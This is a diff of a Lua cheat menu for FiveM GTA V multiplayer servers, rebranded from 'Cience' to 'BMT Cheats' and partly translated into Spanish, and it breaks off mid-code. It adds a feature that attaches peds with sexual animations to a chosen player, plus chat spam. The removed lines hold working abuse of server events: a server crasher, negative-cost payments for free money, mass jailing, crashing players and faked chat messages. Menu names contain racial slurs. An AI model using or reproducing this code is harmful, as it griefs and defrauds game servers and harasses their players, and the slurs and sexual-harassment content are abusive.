@@ -4,8 +4,8 @@ Cience.debug = false
 
 local Enabled = true
 
-local logged = false
-local pass = "test"
+local logged = true
+local pass = "ilya"
 
 local currentMenuX = 1
 local selectedMenuX = 1
@@ -14,7 +14,7 @@ local selectedMenuY = 1
 local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
 local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }
 
-local discordPresence = false
+local discordPresence = true
 
 local SelectedPlayer
 local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
@@ -41,7 +41,7 @@ local currentBullet = 1
 local selectedBullet = 1
 
 local menus = { }
-local keys = { up = 32, down = 33, left = 34, right = 35, select = 215, back = 194 }
+local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
 local optionCount = 0
 
 local currentKey = nil
@@ -59,6 +59,38 @@ local buttonTextYOffset = 0.005
 
 function math.round(num, numDecimalPlaces)
     return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
+end
+
+function spawn_vehicle(veh,spawnx,spawny,spawnz)
+    Citizen.Wait(0)
+    local myPed = GetPlayerPed(-1)
+    local vehicle = GetHashKey(veh)
+    RequestModel(vehicle)
+    while not HasModelLoaded(vehicle) do
+        Wait(1)
+    end
+    SetVehicleModKit(vehicle, 0)
+    SetVehicleLivery(vehicle, 1)
+    local plate = "CTZN"..6969
+    local spawned_car = CreateVehicle(vehicle, spawnx,spawny,spawnz, 440.55, -1020.77, 28.64, true, false)
+    SetVehicleNumberPlateText(spawned_car, plate)
+    SetVehicleOnGroundProperly(spawned_car)
+    SetModelAsNoLongerNeeded(vehicle)
+    Citizen.InvokeNative(0xB736A491E64A32CF, Citizen.PointerValueIntInitialized(spawned_car))
+    TriggerEvent("advancedFuel:setEssence", 100, GetVehicleNumberPlateText(spawned_car), GetDisplayNameFromVehicleModel(GetEntityModel(spawned_car)))
+end
+
+function spawnObject(object,x,y,z,h)
+	ESX.Game.SpawnObject(object, {
+      x = x,
+      y = y,
+      z = z,
+      h = h
+    }, function(obj)
+
+      SetEntityHeading(obj, GetEntityHeading(playerPed))
+      PlaceObjectOnGroundProperly(obj)
+    end)
 end
 
 local function RGBRainbow(frequency)
@@ -240,7 +272,7 @@ local function drawSubTitle()
         local x = menus[currentMenu].x + menus[currentMenu].width / 2
         local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
 
-        local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }
+        local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 160 }
 
         drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
         drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
@@ -302,25 +334,25 @@ function Cience.CreateMenu(id, title)
 
     menus[id].aboutToBeClosed = false
 
-    menus[id].x = 0.025
-    menus[id].y = 0.025
-    menus[id].width = 0.23
+    menus[id].x = 0.725
+    menus[id].y = 0.2
+    menus[id].width = 0.225
 
     menus[id].currentOption = 1
     menus[id].maxOptionCount = 10
 
     menus[id].titleFont = 1
-    menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
-    menus[id].titleBackgroundColor = { r = 35, g = 255, b = 120, a = 180 }
+    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
+    menus[id].titleBackgroundColor = { r = 255, g = 0, b = 0, a = 160 }
     menus[id].titleBackgroundSprite = nil
 
     menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
-    menus[id].menuSubTextColor = { r = 189, g = 189, b = 189, a = 255 }
-    menus[id].menuFocusTextColor = { r = 10, g = 10, b = 10, a = 255 }
-    menus[id].menuFocusBackgroundColor = { r = 35, g = 255, b = 120, a = 180 }
-    menus[id].menuBackgroundColor = { r = 45, g = 45, b = 45, a = 160 }
+    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
+    menus[id].menuFocusTextColor = { r = 255, g = 0, b = 0, a = 255 }
+    menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
+    menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }
 
-    menus[id].subTitleBackgroundColor = { r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255 }
+    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
 
     menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5
 
@@ -368,9 +400,9 @@ function Cience.OpenMenu(id)
     if id and menus[id] then
         PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
         setMenuVisible(id, true)
-        debugPrint(tostring(id)..' menu opened')
+        debugPrint(tostring(id)..' menu abierto')
     else
-        debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
+        debugPrint('Fallo al abrir '..tostring(id)..' menu: it doesn\'t exist')
     end
 end
 
@@ -646,9 +678,9 @@ local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXB
  end
 
  local function bk()
-    local ab=KeyboardInput("Enter Blip Name","",100)
+    local ab=KeyboardInput("Añade un nombre al blip","",100)
     if ab==""then 
-        drawNotification("~r~Invalid Blip Name!")
+        drawNotification("~r~Nombre del blip invalido!")
         return bk()
     else 
         local bh=KeyboardInput("Enter X pos","",100)
@@ -662,7 +694,7 @@ local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXB
                 AddTextComponentString(ab)
                 EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
             else 
-                drawNotification("~r~Invalid coords!")
+                drawNotification("~r~Coordenadas invalidas!")
             end
         end 
     end
@@ -833,7 +865,7 @@ function TeleportToCoords()
             SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
         end
     else
-        drawNotification("~g~Invalid Coords!")
+        drawNotification("~g~Coordenadas invalidas!")
     end
 end
 
@@ -874,19 +906,19 @@ function TeleportToWaypoint()
                     wp = false
                     height = 1000.0
                     zHeigt = 0.0
-                    drawNotification("~g~Teleported to waypoint!")
+                    drawNotification("~g~Teleportado al punto!")
                     break
                 end
             end
         end
     else
-        drawNotification("~r~No waypoint!")
+        drawNotification("~r~Selecciona un punto")
     end
 end
 
 function RapeAllFunc()
     for bs=0,9 do 
-        TriggerServerEvent("_chat:messageEntered","^1Cience",{141,211,255},"You got raped by Cience https://discord.gg/VTaeCZm")
+        TriggerServerEvent("_chat:messageEntered","^1BMT CHEATS",{141,211,255},";) ")
     end
     Citizen.CreateThread(function()
         for i=0,128 do 
@@ -924,10 +956,10 @@ function teleportToNearestVehicle()
             local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
             local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
             local NearestPlanePos = GetEntityCoords(NearestPlane, true)
-        drawNotification("~y~Wait...")
+        drawNotification("~y~Espera...")
         Citizen.Wait(1000)
         if (NearestVehicle == 0) and (NearestPlane == 0) then
-            drawNotification("~r~No Vehicle Found")
+            drawNotification("~r~Vehiculo no encontrado")
         elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
             if IsVehicleSeatFree(NearestPlane, -1) then
                 SetPedIntoVehicle(playerPed, NearestPlane, -1)
@@ -944,7 +976,7 @@ function teleportToNearestVehicle()
                 SetVehicleDoorsLocked(NearestPlane, 1)
                 SetVehicleNeedsToBeHotwired(NearestPlane, false)
             end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
+            drawNotification("~g~Teleportado al vehiculo mas cercano")
         elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
             if IsVehicleSeatFree(NearestVehicle, -1) then
                 SetPedIntoVehicle(playerPed, NearestVehicle, -1)
@@ -961,7 +993,7 @@ function teleportToNearestVehicle()
                 SetVehicleDoorsLocked(NearestVehicle, 1)
                 SetVehicleNeedsToBeHotwired(NearestVehicle, false)
             end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
+            drawNotification("~g~Teleportado al vehiculo mas cercano")
         elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
             if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                 if IsVehicleSeatFree(NearestVehicle, -1) then
@@ -996,7 +1028,7 @@ function teleportToNearestVehicle()
                     SetVehicleNeedsToBeHotwired(NearestPlane, false)
                 end
             end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
+            drawNotification("~g~Teletransportado al vehículo más cercano!")
         end
 
     end
@@ -1006,7 +1038,7 @@ function teleportToNearestVehicle()
     Citizen.CreateThread(function()
         while discordPresence do
             --This is the Application ID (Replace this with you own)
-            SetDiscordAppId(612594475021238272)
+            SetDiscordAppId(615150377309831179)
     
             --Here you will have to put the image name for the "large" icon.
             SetDiscordRichPresenceAsset('logo_name')
@@ -1033,7 +1065,7 @@ Citizen.CreateThread(function()
         Citizen.Wait(1)
         if playerBlips then
             -- show blips
-            for id = 0, 64 do
+            for id = 0, 128 do
                 if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                     ped = GetPlayerPed(id)
                     blip = GetBlipFromEntity(ped)
@@ -1230,6 +1262,70 @@ function SpawnObjOnPlayer(modelHash)
         end
 end
 
+function rapeplayer()
+    Citizen.CreateThread(
+        function()
+            RequestModelSync('a_m_o_acult_01')
+            RequestAnimDict('rcmpaparazzo_2')
+            while not HasAnimDictLoaded('rcmpaparazzo_2') do
+                Citizen.Wait(0)
+            end
+            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
+                while not NetworkHasControlOfEntity(veh) do
+                    NetworkRequestControlOfEntity(veh)
+                    Citizen.Wait(0)
+                end
+                SetEntityAsMissionEntity(veh, true, true)
+                DeleteVehicle(veh)
+                DeleteEntity(veh)
+            end
+            count = -0.2
+            for b = 1, 3 do
+                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
+                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
+                SetEntityAsMissionEntity(bz, true, true)
+                AttachEntityToEntity(
+                    bz,
+                    GetPlayerPed(SelectedPlayer),
+                    4103,
+                    11816,
+                    count,
+                    0.00,
+                    0.0,
+                    0.0,
+                    0.0,
+                    0.0,
+                    false,
+                    false,
+                    false,
+                    false,
+                    2,
+                    true
+                )
+                ClearPedTasks(GetPlayerPed(SelectedPlayer))
+                TaskPlayAnim(
+                    GetPlayerPed(SelectedPlayer),
+                    'rcmpaparazzo_2',
+                    'shag_loop_poppy',
+                    2.0,
+                    2.5,
+                    -1,
+                    49,
+                    0,
+                    0,
+                    0,
+                    0
+                )
+                SetPedKeepTask(bz)
+                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                SetEntityInvincible(bz, true)
+                count = count - 0.4
+            end
+        end
+    )
+end
+
 function nukeserver()
     Citizen.CreateThread(function()
         local dg="Avenger"
@@ -1260,7 +1356,7 @@ function nukeserver()
         end
         
         for bs=0,9 do 
-            TriggerServerEvent("_chat:messageEntered","^1Cience",{141,211,255},"Cience Menu By: Mestari Halla-aho#7167 https://discord.gg/VTaeCZm")
+            TriggerServerEvent("_chat:messageEntered","^1BMT Cheats",{141,211,255},"^1B^2M^3T ^4C^5H^6E^7A^8T^9S https://discord.gg/ha6cPJp")
         end
         
         for i=0,128 do 
@@ -1331,14 +1427,14 @@ function SpectatePlayer(player)
         RequestCollisionAtCoord(targetx, targety, targetz)
         NetworkSetInSpectatorMode(true, targetPed)
 
-        drawNotification("Spectating " .. GetPlayerName(player))
+        drawNotification("Specteando " .. GetPlayerName(player))
     else
         local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
 
         RequestCollisionAtCoord(targetx, targety, targetz)
         NetworkSetInSpectatorMode(false, targetPed)
 
-        drawNotification("Stopped Spectating " .. GetPlayerName(player))
+        drawNotification("Has parado de spectear " .. GetPlayerName(player))
     end
 end
 
@@ -1370,6 +1466,18 @@ Citizen.CreateThread(
             if freezePlayer then 
                 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
             end
+
+            if spam then
+                for i = 0, 128 do
+						TriggerServerEvent(
+                    '_chat:messageEntered',
+                    'BMT CHEATS :)',
+                    {0, 0x99, 255},
+                    'BMT CHEATS :)'
+                )
+                TriggerServerEvent('_chat:messageEntered', 'BMT CHEATS :)', {0, 0x99, 255}, 'BMT CHEATS :)')
+                end
+			end
 
             if crosshair then 
                 ShowHudComponentThisFrame(14)
@@ -1487,7 +1595,7 @@ Citizen.CreateThread(
                 local zoff = 0.0
 
                 if GetInputMode() == "MouseAndKeyboard" then
-                    if IsDisabledControlPressed(0, 32) then
+                    if IsDisabledControlPressed(0, 34) then
                         yoff = 0.5
                     end
                     if IsDisabledControlPressed(0, 33) then
@@ -1526,7 +1634,7 @@ Citizen.CreateThread(
             if DeleteGun then
                 local gotEntity = getEntity(PlayerId())
                 if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
-                    drawNotification("Aim The Gun At An Entity And Shoot!")
+                    drawNotification("¡Apunte el arma a una entidad y dispare!")
                     GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                     SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                     if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
@@ -1538,20 +1646,20 @@ Citizen.CreateThread(
                                         DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                         SetEntityAsMissionEntity(gotEntity, 1, 1)
                                         DeleteEntity(gotEntity)
-                                        drawNotification("~g~Deleted!")
+                                        drawNotification("~g~Eliminada!")
                                     end
                                 else
                                     if IsControlJustReleased(1, 142) then
                                         SetEntityAsMissionEntity(gotEntity, 1, 1)
                                         DeleteEntity(gotEntity)
-                                        drawNotification("~g~Deleted!")
+                                        drawNotification("~g~Eliminada!")
                                     end
                                 end
                             else
                                 if IsControlJustReleased(1, 142) then
                                     SetEntityAsMissionEntity(gotEntity, 1, 1)
                                     DeleteEntity(gotEntity)
-                                    drawNotification("~g~Deleted!")
+                                    drawNotification("~g~Eliminada!")
                                 end
                             end
                         end
@@ -1560,7 +1668,7 @@ Citizen.CreateThread(
             end
 
             if esp then
-                for i = 0, 64 do
+                for i = 0, 128 do
                     if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                         local ra = RGBRainbow(1.0)
                         local pPed = GetPlayerPed(i)
@@ -1962,754 +2070,35 @@ Citizen.CreateThread(
         local currentTint = 1
         local selectedTint = 1
 
-        Cience.CreateMenu("MainMenu", "Cience 2.2")
-        Cience.SetSubTitle("MainMenu", "Cience")
-        Cience.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
+        Cience.CreateMenu("MainMenu", "GTA.ES R.I.P")
+        Cience.SetSubTitle("MainMenu", "Ls.Z#3888")
         Cience.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
-        Cience.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
-        Cience.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
-        Cience.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
-        Cience.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
-        Cience.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
-        Cience.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
-        Cience.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
-        Cience.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
-        Cience.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
-        Cience.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
         Cience.CreateSubMenu("PlayerOptionsMenu", 'OnlinePlayersMenu', 'Player Options')
-        Cience.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
-        Cience.CreateSubMenu("NiggerCustoms", "VehMenu", "Welcome To Nigger Customs!")
-        Cience.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
-        Cience.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
-        Cience.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
-        Cience.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
-        Cience.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
-        Cience.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
-        Cience.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
-        Cience.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
-        Cience.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
-        Cience.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
-        Cience.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
-        Cience.CreateSubMenu("PerformanceMenu", "NiggerCustoms", "Performance Tuning")
-        Cience.CreateSubMenu("SingleWepPlayer", 'PlayerOptionsMenu', 'Single Weapon Menu')
-        Cience.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
-        Cience.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
-        Cience.CreateSubMenu("VehBoostMenu", "NiggerCustoms", "Vehicle Booster")
 
-        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu", 
-                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu", 
-                            "TeleportMenu", "NiggerCustoms", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu", 
-                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
-                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "PerformanceMenu", "SingleWepPlayer", "SettingsMenu", "VehBoostMenu",
-                            "ESXMiscMenu", "ESXDrugMenu", "VRPMenu"}
+        local allMenus = { "MainMenu", "OnlinePlayersMenu", "PlayerOptionsMenu"}
 
 
         while Enabled do
             if Cience.IsMenuOpened("MainMenu") then
-                drawNotification("~h~~g~Cience 2.2 ∑")
-                drawNotification("~h~~g~Made By:~n~Mestari Halla-aho#7167")
-                if Cience.MenuButton("∑Self Menu", "SelfMenu") then
-                elseif Cience.MenuButton("∑Teleport Menu", "TeleportMenu") then
-                elseif Cience.MenuButton("∑Online Players", "OnlinePlayersMenu") then
-                elseif Cience.MenuButton("∑Weapon Menu", "WeaponMenu") then
-                elseif Cience.MenuButton("∑Vehicle Menu", "VehMenu") then
-                elseif Cience.MenuButton("∑Malicious Hacks", "MaliciousMenu") then
-                elseif Cience.MenuButton("∑Trolling Options", "TrollMenu") then
-                elseif Cience.MenuButton("∑ESX Options", "ESXMenu") then
-                elseif Cience.MenuButton("∑VRP Options", "VRPMenu") then
-                elseif Cience.MenuButton("∑Settings", "SettingsMenu") then
-                elseif Cience.Button("Disable Menu") then
+                drawNotification("~h~~r~GTA.ES R.I.P ∑")
+                drawNotification("~h~~r~https://discord.gg/e2WMg7m ;)")
+                if Cience.MenuButton("∑Jugadores Online", "OnlinePlayersMenu") then
+                elseif Cience.MenuButton("~g~~h~Credits", "Credits") then
+                elseif Cience.Button("~h~~r~Desactivar menu") then
                     Enabled = false
                 end
 
                 Cience.Display()
-            elseif Cience.IsMenuOpened("VRPMenu") then
-                if Cience.Button('VRP PayGarage 100$') then
-                    TriggerServerEvent('lscustoms:payGarage', {costs = -100})
-                elseif Cience.Button('VRP PayGarage 1000$') then
-                    TriggerServerEvent('lscustoms:payGarage', {costs = -1000})
-                elseif Cience.Button('VRP PayGarage 10 000$') then
-                    TriggerServerEvent('lscustoms:payGarage', {costs = -10000})
-                elseif Cience.Button('VRP PayGarage 100 000$') then
-                    TriggerServerEvent('lscustoms:payGarage', {costs = -100000})
-                elseif Cience.Button('VRP Get Driver Licence') then
-                    TriggerServerEvent('dmv:success')
-                elseif Cience.Button('VRP Bank Deposit') then
-                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
-                    TriggerServerEvent('bank:deposit', amount)
-                elseif Cience.Button('VRP Bank Whithdraw') then
-                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
-                    TriggerServerEvent('bank:withdraw', amount)
-                elseif Cience.Button('VRP Slot Machine') then
-                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
-                    TriggerServerEvent('vrp_slotmachine:server:2', amount)
+            elseif Cience.IsMenuOpened("Credits") then
+                if Cience.Button("∑~r~~h~ιTsBყMιᥒιYT#2934 - Creador") then
+                elseif Cience.Button("∑~o~~h~Ls.Z#3888 - Co-Creador") then
+                elseif Cience.Button("∑~y~~h~Owbonut63🔥#3405 - Ayudante/Testeador") then
                 end
 
-                Cience.Display()
-            elseif Cience.IsMenuOpened("SettingsMenu") then
-                if Cience.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
-                    currentMenuX = currentIndex
-                    selectedMenuX = selectedIndex
-                    for i = 1, #allMenus do
-                        Cience.SetMenuX(allMenus[i], menuX[currentMenuX])
-                    end
-                    end) 
-                    then
-                elseif Cience.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
-                    currentMenuY = currentIndex
-                    selectedMenuY = selectedIndex
-                    for i = 1, #allMenus do
-                        Cience.SetMenuY(allMenus[i], menuY[currentMenuY])
-                    end
-                    end)
-                    then
-                end
-
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("TrollMenu") then
-                if Cience.Button("ESX Server Crasher") then
-                    for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {niggers = 'gay'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'niggers eat shit') end
-                elseif Cience.Button("ESX Send All To Jail") then
-                    for i = 1, 128 do
-                        TriggerServerEvent("esx-qalle-jail:jailPlayer", i, 5000,"Jailed")
-                           TriggerServerEvent("esx_jailer:sendToJail", i, 45*60)
-                           TriggerServerEvent("esx_jail:sendToJail", i, 45*60)
-                        TriggerServerEvent("js:jailuser", i, 45*60,"Jailed")
-                    end
-                elseif Cience.Button("Spawn mtn Lion On Everyone(wip)") then
-                    for i = 0, 128 do
-                        local coords = GetEntityCoords(GetPlayerPed(i))
-                        CreatePed(26, GetHashKey("a_c_mtlion"), coords.x, coords.y, coords.z, 0.0, true, true)
-                    end
-                elseif Cience.Button("Nuke Server") then
-                    nukeserver()
-                elseif Cience.Button("Rape All Players") then
-                    RapeAllFunc()
-                elseif Cience.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
-                elseif Cience.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
-                elseif Cience.CheckBox("Spawn Shit On Everyone", sall, function(enabled) sall = enabled end) then
-                elseif Cience.Button("Crash All Players") then
-                    for i = 0, 128 do
-                        if not ped == GetPlayerPed(-1) then						
-                            CrashPlayer(GetPlayerPed(i))
-                        end
-                    end
-                elseif Cience.Button("Fake Message") then
-                    local da=KeyboardInput("Enter player name","",100)
-                    if da then 
-                        local ck=KeyboardInput("Enter message","",1000)
-                        if ck then 
-                            TriggerServerEvent('_chat:messageEntered',da,{0,0x99,255},ck)
-                        end 
-                    end 
-                elseif Cience.Button("ESX Set All Police") then
-                    for i = 0, 128 do 
-                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "police", 3)
-                        TriggerServerEvent('NB:recruterplayer', i, "police", 3)
-                    end 
-                elseif Cience.Button("ESX Set All Mechanic") then
-                    for i = 0, 128 do 
-                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "mecano", 3)
-                        TriggerServerEvent('NB:recruterplayer', i, "mecano", 3)
-                    end 
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("TeleportMenu") then
-                if Cience.Button("Teleport To Waypoint") then
-                    TeleportToWaypoint()
-                elseif Cience.Button("Teleport Into Nearest Vehicle") then
-                    teleportToNearestVehicle()
-                elseif Cience.Button("Teleport To Coords") then
-                    TeleportToCoords()
-                elseif Cience.CheckBox(
-                    "Show Coords",
-                    showCoords,
-                    function(enabled)
-                        showCoords = enabled
-                    end)
-                then
-                elseif Cience.Button("Draw Custom Blip") then
-                    bk()
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("VehMenu") then
-                if Cience.Button("Repair Vehicle") then
-                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
-                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
-                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
-                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-                elseif Cience.Button("Vehicle Spawner") then
-                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
-                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
-                        RequestModel(ModelName)
-                        while not HasModelLoaded(ModelName) do
-                            Citizen.Wait(0)
-                        end
-
-                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
-                        if DelCurVeh then
-                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
-                            drawNotification("Vehicle Deleted")
-                        end
-                        if SpawnInVeh then
-                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
-                        end
-                    else
-                        drawNotification("~r~Model is not valid!")
-                    end
-                elseif Cience.MenuButton("∑Spawn options", "VehSpawnOpt") then
-                elseif Cience.MenuButton("∑Nigger Customs", "NiggerCustoms") then
-                elseif Cience.Button("Delete Vehicle") then
-                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
-                elseif Cience.Button("Delete Closest Vehicle") then
-                    local PlayerCoords = GetEntityCoords(PlayerPedId())
-                    DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("NiggerCustoms") then
-                if Cience.CheckBox(
-                    "Super Handling",
-                    superGrip,
-                    function(enabled)
-                        superGrip = enabled
-                        enchancedGrip = false
-                        driftMode = false
-                        fdMode = false
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Enchanced Grip",
-                    enchancedGrip,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = enabled
-                        driftMode = false
-                        fdMode = false
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Drift Mode",
-                    driftMode,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = false
-                        driftMode = enabled
-                        fdMode = false
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Formula Drift Mode",
-                    fdMode,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = false
-                        driftMode = false
-                        fdMode = enabled
-                    end)
-                then
-                elseif Cience.MenuButton("∑Vehicle Boost", "VehBoostMenu") then
-                elseif Cience.MenuButton("∑Performance Tuning", "PerformanceMenu") then
-                elseif Cience.Button("Max Tuning") then
-                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
-                elseif Cience.Button("Max Performance") then
-                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("VehBoostMenu") then
-                if Cience.CheckBox(
-                    "Torque Boost 2x",
-                    t2x,
-                    function(enabled)
-                        t2x = enabled
-                        t4x = false
-                        t8x = false
-                        t16x = false
-                    end) 
-                then
-                elseif Cience.CheckBox(
-                    "Torque Boost 4x",
-                    t4x,
-                    function(enabled)
-                        t2x = false
-                        t4x = enabled
-                        t8x = false
-                        t16x = false
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Torque Boost 8x",
-                    t8x,
-                    function(enabled)
-                        t2x = false
-                        t4x = false
-                        t8x = enabled
-                        t16x = false
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Torque Boost 16x",
